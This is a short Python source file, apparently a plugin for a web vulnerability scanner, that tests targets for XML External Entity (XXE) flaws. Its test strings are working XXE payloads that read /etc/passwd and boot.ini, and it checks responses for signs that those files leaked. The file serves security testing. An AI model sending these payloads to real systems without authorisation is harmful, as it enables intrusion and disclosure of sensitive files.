from vulns import *

# So, here's a sample vuln class without all the comments so you can read it cleanly. 
# It's essentially the same as the XSS class, but with a few differences...
# If you don't get what it's looking for, it's time to go away and learn all
# about one of my favourite vulns: XML External Entities (XXE) :D :D 
class vuln_class(vuln):
	vuln_name="[XXE]"
	test_strings = ["<test-string>","<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><foo>&file;</foo>","<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY file SYSTEM \"file:///c:/boot.ini\">]><foo>&file;</foo>"]
	responses_pos=["test","boot.ini","root","<test-string>"]
	responses_neg=["error","Error"]
	
	def test_vuln(self,target):
		print "Scanning for XXE..."
		if not self.live_test(target):
			return
		xxe_test=self.send_scan_body(target)
		xxe_test2=self.send_scan_append(target)
		for i in xxe_test2:
			xxe_test.append(i)
		if xxe_test is None:
			return
		for i in xxe_test:
			for j in self.responses_pos:
				if j in i:
					print self.vuln_name,"VULN!"
